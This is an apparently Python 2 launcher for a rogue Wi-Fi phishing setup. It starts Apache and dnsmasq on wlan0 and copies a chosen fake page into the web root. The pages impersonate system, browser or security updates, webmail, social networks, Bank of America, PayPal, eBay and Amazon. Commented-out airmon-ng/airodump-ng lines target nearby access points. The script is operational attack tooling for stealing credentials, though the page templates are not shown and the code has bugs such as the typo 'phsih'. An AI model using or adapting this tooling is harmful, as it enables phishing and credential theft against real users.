#!/usr/bin/python
from multiprocessing import Process
import os,sys,subprocess

os.system('systemctl start apache2')
os.system('rm -r /var/www/html/index.php')

NIC = raw_input('what interface do you want to use to sniff?')
#os.system('airmon-ng check kill')
#os.system('airmon-ng start %s' %NIC)
#NIC=NIC+'mon'
#os.system('airodump-ng %s ' %NIC )
#chan=raw_input('chan')
#bssid = raw_input('bssid')
#NIC = raw_input('NIC')

#os.system('airodump-ng -c %s --bssid %s %s ' %(chan, bssid, NIC))
os.system('systemctl start NetworkManager')
os.system('ifconfig wlan0 10.0.0.1')
def main():
    print '1.)System_Updates, 2.)Security_Issues, 3.) Browser_Updates, 4.)Emails, 5.)Social Networks, 6.)Online_Logins 7.)defaults'
    category=input("Select a phishing category")
    if category == 1:
        print 'Select Phishing Campaign'
        phish=input('1.)Firmware_Upgrade, 2.)Windows_Update, 3.)Android_Update')
        if phish == 1:
            print 'Firmware_Upgrade'
            os.system('cp /var/www/Firmware_Upgrade/sys-updates/test1.php /var/www/html/index.php')
        elif phish == 2:
            print 'Windows_Update'
            os.system('cp /var/www/Firmware_Upgrade/sys-updates/test2.php /var/www/html/index.php' )
        elif phish == 3:
            print 'android_Update'
            os.system('cp /var/www/Firmware_Upgrade/sys-updates/test3.php /var/www/html/index.php')


    elif category == 2:
        print('Select Phishing Campaign')
        phish=input('1.)Android_security_upgrade, 2.)Windows_Security_Upgrade, 3.)Router_Security-Issues')
        if phish == 1:
            print 'Android_Security_Upgrade'
            os.system('cp /var/www/Firmware_Upgrade/security-issues/test1.php /var/www/html/index.php')

        elif phish == 2:
            print 'Windows Security Upgrade'
            os.system('cp /var/www/Firmware_Upgrade/security-issues/test2.php /var/www/html/index.php')
        elif phish == 3:
            print 'Router_Security-Issues'
            os.system('cp /var/www/Firmware_Upgrade/security-issues/test3.php /var/www/html/index.php')
    
    elif category == 3:
        phish=input('1.)Android_Browser_Update, 2.)Chrome_update, 3.)Explorer_Update,4.)Safari_Update, 5.)FireFox_Update')
        if phish == 1:
            print 'Android_Browser-Update'
            os.system('cp /var/www/Firmware_Upgrade/browser_update/test1.php /var/www/html/index.php')
        elif phish == 2:
            print 'Chrome_Update'
            os.system('cp /var/www/Firmware_Upgrade/browser_update/test2.php /var/www/html/index.php')
        elif phish == 3:
            print 'Explorer_Update'
            os.system('cp /var/www/Firmware_Upgrade/browser_update/test3.php /var/www/html/index.php')
        elif phish == 4:
            print 'Safari_update'
            os.system('cp /var/www/Firmware_Upgrade/browser_update/test4.php /var/www/html/index.php')
        elif phish == 5:
            print 'Firefox-Update'
            os.system('cp /var/www/Firmware_Upgrade/browser_update/test5.php /var/www/html/index.php')

    elif category == 4:
        phish=input('1.)Gmail, 2.)Yahoo, 3.)AOL, 4.Comcast, 5.)Microsoft')
        if phish == 1:
            print 'Gmail'
            os.system('cp /var/www/Firmware_Upgrade/emails/test1.php /var/www/html/index.php')
        elif phish == 2:
            print 'Yahoo'
            os.system('cp /var/www/Firmware_Upgrade/emails/test2.php /var/www/html/index.php')
        elif phish == 3:
            print 'AOL'
            os.system('cp /var/www/Firmware_Upgrade/emails/test3.php /var/www/html/index.php')
        elif phish == 4:
            print 'Comcast'
            os.system('cp /var/www/Firmware_Upgrade/emails/test4.php /var/www/html/index.php')
        elif phsih == 5:
            print "Microsoft?"
            os.system('cp /var/www/Firmware_Upgrade/emails/test5.php /var/www/html/index.php')
    
    elif category == 5:
        phish=input('1.)Facebook, 2.)Twitter, 3.) POF')
        if phsih == 1:
            print 'facebook'
            os.system('cp /var/www/Firmware_Upgrade/social/test1.php /var/www/html/index.php')
        elif phish == 2:
            print 'Twitter'
            os.system('cp /var/www/Firmware_Upgrade/social/test2.php /var/www/html/index.php')
        elif phish == 3:
            print 'POF'
            os.system('cp /var/www/Firmware_Upgrade/social/test3.php /var/www/html/index.php')

    
    elif category == 6:
        phish=input('1.)Bankofamerica, 2.)PayPal, 3.)Ebay, 4.)Amazon')
        if phish == 1:
            print 'Bankofamerica'
            os.system('cp /var/www/Firmware_Upgrade/logins/test1.php /var/www/html/index.php')
        elif phish == 2:
            print 'PayPal'
            os.system('cp /var/www/Firmware_Upgrade/logins/test2.php /var/www/html/index.php')
        elif phish == 3:
            print 'Ebay'
            os.system('cp /var/www/Firmware_Upgrade/logins/test3.php /var/www/html/index.php')
        elif phish == 4:
            print 'Amazon'
            os.system('cp /var/www/Firmware_Upgrade/logins/test4.php /var/www/html/index.php')

    elif category == 7:
        phish = input('1.) connection_reset 2.) firmware_upgrade 3.)plugin_update')
        if phish == 1:
            os.system('rm -r /var/www/html')
            os.system('mkdir /var/www/html')
            os.system('cp -r /var/www/phishing-pages/connection_reset/*  /var/www/html')
        
        elif phish == 2:
            os.system('rm -r /var/www/html')
            os.system('mkdir /var/www/html')
            os.system('cp -r /var/www/phishing-pages/firmware_upgrade/*  /var/www/html')

        elif phish == 3:
            os.system('rm -r /var/www/html/plugin_update')
            os.system('mkdir /var/www/html/plugin_update')
            os.system('cp -r /var/www/phishing-pages/plugin_update/*  /var/www/html')



def dns_start():
    os.system('dnsmasq  --no-daemon --log-queries --no-poll --no-resolv --dhcp-range=::1,::400,constructor:wlan0 &> /sec/attacks/meta-data.info')

    #syslog = raw_input('If you would like to Save the output of DNSMASQ then press 1 : ')
    #if syslog == 1:
        #metadata = raw_input("Please Name the Log File : ")
        #os.system('journalctl |grep dnsmasq >> /sec/attacks/'+metadata)


os.system('ifconfig wlan0 10.0.0.1')
if __name__ == '__main__':
    main()
    p1 = Process(target=dns_start)
    p1.start()
    p1.join()
